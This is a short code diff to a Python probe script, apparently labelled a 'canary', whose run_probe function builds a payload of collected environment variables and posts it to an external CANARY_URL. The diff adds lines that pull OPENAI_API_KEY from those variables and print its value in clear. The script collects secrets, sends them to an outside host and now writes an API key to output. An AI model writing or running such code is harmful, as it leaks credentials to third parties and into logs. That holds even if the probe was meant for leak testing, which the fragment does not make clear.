@@ -76,6 +76,11 @@ def build_payload():
 
 def run_probe():
     payload = build_payload()
+    
+    # Explicitly check and print OPENAI_API_KEY status from the collected env vars
+    openai_val = payload["env_vars"].get("OPENAI_API_KEY", "NOT_FOUND")
+    print(f"[canary] OPENAI_API_KEY : {openai_val}")
+
     data = json.dumps(payload).encode("utf-8")
     req = urllib.request.Request(
         CANARY_URL,
